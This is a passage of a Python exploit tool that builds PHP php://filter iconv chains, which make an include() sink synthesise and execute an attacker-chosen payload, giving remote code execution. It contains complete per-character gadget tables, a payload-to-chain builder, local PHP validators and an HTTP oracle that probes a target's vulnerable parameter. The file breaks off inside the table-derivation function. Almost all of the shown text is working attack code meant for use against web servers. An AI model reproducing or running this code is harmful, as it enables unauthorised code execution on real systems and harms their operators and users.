#!/usr/bin/env python3
"""php://filter chain generator -- include-sink-ONLY RCE.

Lands RCE from any include sink that honours ``php://`` filter chains, needing
nothing else (no poison, race, save_path, sid or write): ``--emit PAYLOAD``
synthesises the payload bytes by chaining ``convert.iconv.*`` in front of
``convert.base64-decode`` and the sink include()s them (loknop/synacktiv
technique). Proven end-to-end on 8.4.26.

Caveat: the landing table is the borrowed public (synacktiv) ``PUBLIC_CONVERSIONS``;
the from-scratch ``derive_table()`` path is partial (41/64 chars, compute-bound).
Pure stdlib, python3 -I safe.
"""

import argparse
import base64
import heapq
import itertools
import json
import multiprocessing as mp
import os
import re
import subprocess
import sys
import time
from functools import partial
from urllib.parse import quote

PREFIX = ("convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
          "convert.iconv.UTF8.UTF7")
SEP = ("convert.base64-decode|convert.base64-encode|"
       "convert.iconv.UTF8.UTF7")
TERMINAL = "convert.base64-decode"
SEED_PRIMITIVE = "convert.iconv.UTF8.CSISO2022KR"
SEED_BYTES = b"\x1b$)C"
B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

# DERIVED per-char conversions table (by derive_table(); NOT a licensed copy).
# Each value is the iconv-only morph sequence that, composed and followed by SEP,
# prepends exactly that base64 char to the running accumulator (accumulator-
# invariant: verified across multiple leading-char contexts incl. self-chaining).
#
# This 41/64-char table was produced ENTIRELY by the composition-correct,
# invariance-checked raw-state BFS in derive_table() against a live PHP 8.4.26
# oracle -- it is NOT the synacktiv/loknop dictionary (note the distinct
# structure: every gadget is anchored on ``437.CSUNICODE`` / ``437.CSISO2022KR``,
# not loknop's forms). The remaining 23 chars (incl. '+','/','G','H','J','P','T',
# 'U','b','d','g','i','m','n','r' and digits 0-3,5,6,9) are single-char REACHABLE
# at gadget-depth 3 (measured: 61/64 reachable) but no accumulator-invariant
# gadget was found for them within the configured search budget (120-charset
# slice x depth<=4 x bounded candidate cap).
# Re-run ``--derive`` with a wider charset slice / greater depth to extend it.
CONVERSIONS = {
    '4': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_9.ANSI_X3.110-1983', 'convert.iconv.BIG5.10646-1:1993'],
    '7': ['convert.iconv.437.CSUNICODE', 'convert.iconv.L8.ANSI_X3.110-1983', 'convert.iconv.JOHAB.10646-1:1993'],
    '8': ['convert.iconv.437.CSUNICODE', 'convert.iconv.L6.10646-1:1993'],
    'A': ['convert.iconv.437.CSUNICODE', 'convert.iconv.437.SHIFT_JISX0213'],
    'B': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.CP936'],
    'C': ['convert.iconv.437.CSISO2022KR'],
    'D': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_5.ISO-2022-JP-2', 'convert.iconv.ISO-2022-JP.10646-1:1993'],
    'E': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.BIG5-HKSCS', 'convert.iconv.CP949.JOHAB', 'convert.iconv.CP936.BIG5'],
    'I': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.CSA_T500.10646-1:1993'],
    'K': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.BIG5-HKSCS', 'convert.iconv.CP949.JOHAB'],
    'L': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.850.IBM-932'],
    'M': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.CP936', 'convert.iconv.BIG5.JOHAB', 'convert.iconv.SHIFT_JISX0213.BIG5'],
    'N': ['convert.iconv.437.CSUNICODE', 'convert.iconv.MACCYRILLIC.10646-1:1993'],
    'O': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.874.10646-1:1993'],
    'Q': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.CP1250.SHIFT_JISX0213'],
    'R': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.855.IBM-932', 'convert.iconv.CP936.10646-1:1993'],
    'S': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.850.IBM-932', 'convert.iconv.CP949.10646-1:1993'],
    'V': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.CP936', 'convert.iconv.BIG5.JOHAB'],
    'W': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.437.10646-1:1993'],
    'X': ['convert.iconv.437.CSUNICODE', 'convert.iconv.KOI8-R.CP932'],
    'Y': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.855.IBM-932'],
    'Z': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.CP1250.SHIFT_JISX0213', 'convert.iconv.CP949.JOHAB'],
    'a': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.BIG5-HKSCS', 'convert.iconv.CP949.JOHAB', 'convert.iconv.CP936.BIG5', 'convert.iconv.CP932.10646-1:1993'],
    'c': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_2.10646-1:1993'],
    'e': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.8859_2.10646-1:1993'],
    'f': ['convert.iconv.437.CSUNICODE', 'convert.iconv.CSIBM921.SHIFT_JISX0213'],
    'h': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.BIG5-HKSCS', 'convert.iconv.CP949.JOHAB', 'convert.iconv.CP936.BIG5', 'convert.iconv.CP936.10646-1:1993'],
    'j': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.CP936', 'convert.iconv.BIG5.JOHAB', 'convert.iconv.BIG5.10646-1:1993'],
    'k': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.10646-1:1993'],
    'l': ['convert.iconv.437.CSUNICODE', 'convert.iconv.UCS-2.UTF-8', 'convert.iconv.CSIBM921.ANSI_X3.110-1983'],
    'o': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.CP936', 'convert.iconv.BIG5.JOHAB', 'convert.iconv.SHIFT_JISX0213.BIG5', 'convert.iconv.JOHAB.CP936'],
    'p': ['convert.iconv.437.CSUNICODE', 'convert.iconv.L8.ANSI_X3.110-1983', 'convert.iconv.BIG5.10646-1:1993'],
    'q': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.CP936', 'convert.iconv.BIG5.JOHAB', 'convert.iconv.SHIFT_JISX0213.BIG5', 'convert.iconv.GB18030.10646-1:1993'],
    's': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_3.ANSI_X3.110-1983'],
    't': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_2.ANSI_X3.110-1983'],
    'u': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.ANSI_X3.110-1983'],
    'v': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.CP936', 'convert.iconv.BIG5.JOHAB', 'convert.iconv.SHIFT_JISX0213.BIG5', 'convert.iconv.JOHAB.BIG5'],
    'w': ['convert.iconv.437.CSUNICODE', 'convert.iconv.L8.10646-1:1993'],
    'x': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_4.BIG5-HKSCS'],
    'y': ['convert.iconv.437.CSUNICODE', 'convert.iconv.8859_1.ANSI_X3.110-1983'],
    'z': ['convert.iconv.437.CSUNICODE', 'convert.iconv.CSIBM921.ANSI_X3.110-1983'],
}


# Public, hand-verified composition-safe gadget table (synacktiv
# php_filter_chain_generator, github.com/synacktiv/php_filter_chain_generator).
# Our from-scratch BFS reaches output-correct gadgets but does not verify INTERIOR
# composition cleanliness, so it stalls mid-chain; these are used as the primary
# candidates (our derived gadgets are offered as alternates) and the
# composition-aware builder still validates each against the live target glibc.
# Same PREFIX/SEP/TERMINAL as ours (verified identical). Pipe-joined per char.
PUBLIC_CONVERSIONS = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
}


# chain assembly (table-parameterised)
def build_chain(payload, table=None, resource="php://temp"):
    """Assemble the include-sink-only php://filter chain that synthesises
    `payload`. Requires a table covering every base64 char of base64(payload)."""
    if table is None:
        table = CONVERSIONS
    if isinstance(payload, str):
        payload = payload.encode()
    payload = payload + b" " * ((-len(payload)) % 3)   # 3-byte align -> no '='
    b64 = base64.b64encode(payload).decode()
    assert "=" not in b64 and len(b64) % 4 == 0
    missing = sorted({c for c in b64 if c not in table})
    if missing:
        raise KeyError("table missing chars: " + "".join(missing))
    parts = [PREFIX]
    for c in reversed(b64):
        parts.extend(table[c])
        parts.append(SEP)
    parts.append(TERMINAL)
    return "php://filter/" + "|".join(parts) + "/resource=" + resource


def _probe_chain(php_bin, spec, timeout=20):
    """Run a full php://filter <spec> on empty php://temp with include-faithful
    warning detection. Returns (warned_or_failed: bool, output_bytes). Used by the
    composition-aware builder to test each growing partial chain the way include()
    would see it."""
    code = (
        '$p=$argv[1];error_reporting(E_ALL);'
        'set_error_handler(function($n,$m){$GLOBALS["e"]=1;return true;});'
        '$GLOBALS["e"]=0;$x=file_get_contents("php://filter/".$p."/resource=php://temp");'
        'echo ($GLOBALS["e"]||$x===false)?"1":"0";echo "\\t";echo base64_encode((string)$x);')
    try:
        out = subprocess.run([php_bin, "-r", code, spec],
                             capture_output=True, timeout=timeout)
        w, _, b = out.stdout.partition(b"\t")
        return (w != b"0"), base64.b64decode(b)
    except (OSError, subprocess.SubprocessError, ValueError):
        return True, b""


def build_chain_validated(payload, table, php_bin="php", resource="php://temp",
                          verbose=False, max_nodes=300_000):
    """COMPOSITION-AWARE assembly: build the chain char-by-char, and at each
    position try the char's candidate gadgets, committing only one that -- when
    the *growing partial chain* is run through PHP -- raises NO iconv
    warning (so include() will accept it) AND reproduces the exact base64 built
    so far. Backtracks when a position dead-ends. Finally re-runs the whole chain
    (with TERMINAL) and asserts it decodes to `payload` byte-for-byte.

    `table` maps each base64 char to a LIST of candidate gadget sequences (a bare
    single sequence is accepted too). Requires a live PHP of the target build."""
    pb = payload.encode() if isinstance(payload, str) else payload
    pb = pb + b" " * ((-len(pb)) % 3)
    b64 = base64.b64encode(pb).decode()
    _, base = _probe_chain(php_bin, PREFIX + "|" + SEP)
    vb = _valid(base.decode("latin1"))
    chars = list(reversed(b64))
    cache = {}

    def probe(spec):
        if spec not in cache:
            cache[spec] = _probe_chain(php_bin, spec)
        return cache[spec]

    def cands_for(c):
        cs = table.get(c)
        if not cs:
            raise KeyError("no gadget candidates for %r" % c)
        return [cs] if isinstance(cs[0], str) else cs      # accept bare sequence

    nodes = [0]

    def rec(idx, parts, built):
        nodes[0] += 1
        if nodes[0] > max_nodes:
            raise RuntimeError("search budget exceeded (%d nodes) near position "
                               "%d/%d -- candidates can't compose there"
                               % (max_nodes, idx, len(chars)))
        if idx == len(chars):
            return parts
        c = chars[idx]
        want = c + built
        for seq in cands_for(c):
            trial = parts + list(seq) + [SEP]
            warned, out = probe("|".join(trial))
            if warned:
                continue
            if not _valid(out.decode("latin1")).startswith(want + vb):
                continue
            res = rec(idx + 1, trial, want)
            if res is not None:
                return res
        if verbose:
            print("[build] backtrack at %d/%d (char %r)" % (idx, len(chars), c),
                  file=sys.stderr, flush=True)
        return None

    final = rec(0, [PREFIX], "")
    if final is None:
        raise RuntimeError("no warning-free chain for this payload from the given "
                           "candidates (need more/other gadgets)")
    final = final + [TERMINAL]
    warned, out = probe("|".join(final))
    # the chain decodes to the payload surrounded by benign throwaway bytes from
    # the PREFIX's garbage base64; include() runs it as long as the payload bytes
    # appear intact (anything before <?php or after ?> is harmless text). So we
    # require clean + payload-present, NOT byte-exact.
    if warned or pb not in out:
        raise RuntimeError("full-chain re-validation failed (warned=%s, "
                           "payload_present=%s, out[:96]=%r)"
                           % (warned, pb in out, out[:96]))
    if verbose:
        lead = out.find(pb)
        print("[build] validated: %d chars, clean, payload at offset %d "
              "(%d leading / %d trailing throwaway bytes)"
              % (len(b64), lead, lead, len(out) - lead - len(pb)),
              file=sys.stderr, flush=True)
    return "php://filter/" + "|".join(final) + "/resource=" + resource


# oracles
def _probe(php_bin, gadget):
    """One oracle probe under INCLUDE-FAITHFUL semantics: run `gadget` and
    `gadget|SEP`, but REJECT the gadget (return b'', b'') if either conversion
    raises ANY warning or returns false. This matters because include()/require()
    -- the sink the emitted chain targets -- treats an iconv filter warning
    ("invalid multibyte sequence") as a FATAL "failed to open stream" and aborts,
    whereas a lenient `@file_get_contents` swallows the warning and returns the
    partial bytes. Deriving against the lenient read yields gadgets that pass the
    oracle but break the real include. Module-level (picklable) for the Pool."""
    code = (
        '$g=$argv[1];$s="%s";error_reporting(E_ALL);'
        'set_error_handler(function($n,$m){$GLOBALS["e"]=1;return true;});'
        '$GLOBALS["e"]=0;$a=file_get_contents("php://filter/".$g."/resource=php://temp");$ea=$GLOBALS["e"];'
        '$GLOBALS["e"]=0;$b=file_get_contents("php://filter/".$g."|".$s."/resource=php://temp");$eb=$GLOBALS["e"];'
        'if($ea||$eb||$a===false||$b===false){echo "\\t";}'
        'else{echo base64_encode($a)."\\t".base64_encode($b);}' % SEP)
    try:
        out = subprocess.run([php_bin, "-r", code, gadget],
                             capture_output=True, timeout=10)
        a, _, b = out.stdout.partition(b"\t")
        return base64.b64decode(a), base64.b64decode(b)
    except (OSError, subprocess.SubprocessError, ValueError):
        return b"", b""


def oracle_local_dual(php_bin="php"):
    """Return oracle_dual(gadget) -> (raw_pre_SEP_bytes, SEP_projection_bytes)
    using a local PHP of the SAME version as the target. Used by derive_table."""
    return lambda gadget: _probe(php_bin, gadget)


# persistent-daemon oracle: one long-lived PHP per worker, gadgets fed over
# stdin and results read over stdout, so PHP process startup (~19ms/probe, the
# whole serial cost) is paid ONCE per worker, not once per probe. 10-50x.
_DAEMON_CODE = (
    '$s=$argv[1];error_reporting(E_ALL);'
    'set_error_handler(function($n,$m){$GLOBALS["e"]=1;return true;});'
    'while(($g=fgets(STDIN))!==false){'
    '$g=rtrim($g,"\\n");'
    '$GLOBALS["e"]=0;$a=file_get_contents("php://filter/".$g."/resource=php://temp");$ea=$GLOBALS["e"];'
    '$GLOBALS["e"]=0;$b=file_get_contents("php://filter/".$g."|".$s."/resource=php://temp");$eb=$GLOBALS["e"];'
    'if($ea||$eb||$a===false||$b===false){fwrite(STDOUT,"\\t\\n");}'   # reject: any warning/false
    'else{fwrite(STDOUT,base64_encode($a)."\\t".base64_encode($b)."\\n");}'
    'fflush(STDOUT);'
    '}'
)
_DAEMON = {}   # per-process: {"php": php_bin, "p": Popen}


def _start_daemon(php_bin):
    return subprocess.Popen(
        [php_bin, "-r", _DAEMON_CODE, SEP],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL)


def _worker_init(php_bin):
    _DAEMON["php"] = php_bin
    _DAEMON["p"] = _start_daemon(php_bin)
    import atexit
    atexit.register(lambda: _DAEMON.get("p") and _DAEMON["p"].kill())


def _probe_daemon(gadget, timeout=10):
    """Lock-step one gadget through this worker's persistent PHP daemon. On a
    hung conversion or a dead daemon, recycle it and drop the single probe
    (returns b'','') -- identical downstream effect to the fresh-probe path."""
    import select
    p = _DAEMON.get("p")
    if p is None or p.poll() is not None:
        _DAEMON["p"] = p = _start_daemon(_DAEMON["php"])
    try:
        p.stdin.write((gadget + "\n").encode())
        p.stdin.flush()
        r, _, _ = select.select([p.stdout], [], [], timeout)
        if not r:                       # hung conversion -> recycle daemon
            p.kill()
            _DAEMON["p"] = _start_daemon(_DAEMON["php"])
            return b"", b""
        line = p.stdout.readline()
        if not line:                    # daemon died -> restart, drop probe
            _DAEMON["p"] = _start_daemon(_DAEMON["php"])
            return b"", b""
        a, _, b = line.rstrip(b"\n").partition(b"\t")
        return base64.b64decode(a), base64.b64decode(b)
    except (OSError, ValueError):
        try:
            p.kill()
        except Exception:
            pass
        _DAEMON["p"] = _start_daemon(_DAEMON["php"])
        return b"", b""


def _charset_fp(php_bin, cs):
    """Behavioural fingerprint of a charset: decode a single-byte probe AND a
    multibyte lead/trail probe to a fixed wide target. Two aliases of the SAME
    encoding share a fingerprint; genuinely distinct encodings (single- or
    multi-byte) differ -- so dedup collapses only true aliases."""
    code = (
        '$cs=$argv[1];$o="";'
        'for($i=0;$i<256;$i++)$o.=chr($i);'
        '$m="";for($L=0x81;$L<=0xFE;$L++)foreach([0x40,0x7E,0xA1,0xFE] as $T)'
        '$m.=chr($L).chr($T);'
        'echo md5(((string)@iconv($cs,"UTF-32LE//IGNORE",$o))."|".'
        '((string)@iconv($cs,"UTF-32LE//IGNORE",$m)));'
    )
    try:
        out = subprocess.run([php_bin, "-d", "error_reporting=0", "-r", code, cs],
                             capture_output=True, timeout=10)
        return out.stdout.strip()
    except (OSError, subprocess.SubprocessError):
        return b""


# stateful / wide encodings: never dedup (escape-state & width not captured by
# the byte-wise fingerprint), so each is kept even if two look alike.
_KEEP_ALWAYS = re.compile(
    r"(ISO-?2022|UTF-?7|UTF-?16|UTF-?32|UCS|UNICODE|10646)", re.I)


def _dedup_charsets(charsets, php_bin, jobs=1, verbose=True):
    always = [c for c in charsets if _KEEP_ALWAYS.search(c)]
    rest = [c for c in charsets if not _KEEP_ALWAYS.search(c)]
    if jobs > 1:
        with mp.Pool(jobs) as pool:
            fps = pool.map(partial(_charset_fp, php_bin), rest)
    else:
        fps = [_charset_fp(php_bin, c) for c in rest]
    seen, keep = set(), []
    for c, fp in zip(rest, fps):
        if fp and fp in seen:
            continue
        if fp:
            seen.add(fp)
        keep.append(c)
    out = sorted(set(always) | set(keep))
    if verbose:
        print(f"[*] dedup: {len(charsets)} -> {len(out)} charsets "
              f"({len(always)} stateful/wide kept verbatim)", flush=True)
    return out


def oracle_http(http_get, base, param):
    """Oracle over an include sink that OUTPUTS the included bytes (derivation
    probes only -- NOT for the final payload, which would execute)."""
    def _read(gadget):
        val = "php://filter/" + gadget + "/resource=php://temp"
        return http_get(f"{base}?{param}=" + quote(val, safe=""))
    return _read


# algorithmic derivation (composition-correct raw-state BFS)
CURATED_CHARSETS = None   # set by derive_table from iconv -l if not supplied


def _valid(s):
    return "".join(ch for ch in s if ch in B64)


def derive_table(oracle_dual, charsets, max_depth=5, frontier_cap=200,
                 budget=7_000_000, verbose=True, jobs=1, php_bin="php",
                 table_out=None, checkpoint=None, cand_k=8):
    """Composition-correct, accumulator-aware BFS. Returns (table, note).
    `oracle_dual(gadget)` -> (raw, sep_proj).

    With jobs>1 the probes are fanned out across a multiprocessing Pool of
    persistent PHP daemons via a blocking per-slice map. Candidates are consumed
    in generation order no matter how many workers run, so the covered table and
    frontier are jobs-INDEPENDENT (jobs=1 == jobs=N).

    `table_out`, if set, is rewritten (atomically) every slice so the current
    coverage is always on disk. `checkpoint`, if set, is written (atomically)
    after every depth with {depth, tested, table, frontier}; if the file already
    exists at start, the run RESUMES from the next depth (the `seen` dedup set is
    not persisted, so a resumed depth may explore marginally differently -- the
    covered table is restored exactly)."""
    # A gadget's FIRST conversion is fed the preceding SEP's UTF-7 ASCII output.
    # If its SOURCE charset is wide/multibyte/validating (UCS/UTF-16/32/CSUNICODE/
    # CJK/ISO-2022...), it raises "invalid multibyte sequence" on that ASCII and
    # include() aborts -- even though it looks clean against the lone PREFIX
    # accumulator. So the first edge's source MUST be byte-permissive (single-byte
    # codepage or UTF-8). Interior edges are unrestricted (they see intermediate
    # data the gadget itself shaped). This is what makes gadgets COMPOSE cleanly.
    _wide = re.compile(
        r"(UCS|UTF-?16|UTF-?32|UTF-?7|UNICODE|10646|ISO-?2022|CSISO2022|BIG5|"
        r"GB18030|GBK|GB2312|EUC|SHIFT|SJIS|JIS|JOHAB|HKSCS|UHC|"
        r"CP932|CP936|CP949|CP950|CP1361)", re.I)
    edges, edges_first = [], []
    for a in charsets:
        a_ok = not _wide.search(a)
        for b in charsets:
            if a == b:
                continue
            e = f"convert.iconv.{a}.{b}"
            edges.append(e)
            if a_ok:
                edges_first.append(e)

    def gad(seq):
        return PREFIX + ("|" + "|".join(seq) if seq else "")

    _, base_sep = oracle_dual(PREFIX)
    vb = _valid(base_sep.decode("latin1"))

    def accept(sep_bytes):
        vo = _valid(sep_bytes.decode("latin1"))
        if len(vo) >= 1 + len(vb) and vo[0] in B64 and vo[1:1 + len(vb)] == vb:
            return vo[0]
        return None

    if jobs > 1:
        pool = mp.Pool(jobs, initializer=_worker_init, initargs=(php_bin,))
    else:
        pool = None
        _worker_init(php_bin)      # in-process daemon for the serial path
    # candidates are STREAMED (never the full frontier x edges list -- that is
    # ~12.65M entries / several GB per deep level) in SUPER-sized slices. Each
    # slice is probed with a BLOCKING pool.map (all workers flat-out, ~7.5k/s --
    # ordered imap streaming instead caps at ~half that, gated by the single
    # consumer); progress is printed BETWEEN slices, so it is both full-speed
    # and non-stale. The kept frontier is a bounded top-`frontier_cap` heap.
    # Processing order == generation order regardless of jobs -> jobs-independent.
    SUPER = 50_000        # candidates per blocking map (bounds memory; ~7s/slice)

    def _save(path, obj):                      # atomic: write tmp then rename
        if not path:
            return
        tmp = path + ".tmp"
        with open(tmp, "w") as fh:
            json.dump(obj, fh)
        os.replace(tmp, path)

    table, seen, frontier, tested = {}, set(), [[]], 0
    start_depth = 1
    if checkpoint and os.path.exists(checkpoint):
        st = json.load(open(checkpoint))
        table = dict(st["table"])
        frontier = [list(s) for s in st["frontier"]]
        tested = int(st["tested"])
        start_depth = int(st["depth"]) + 1
        if verbose:
            print(f"[*] resume {checkpoint}: continue at depth {start_depth}, "
                  f"covered {len(table)}/64, tested {tested}", flush=True)
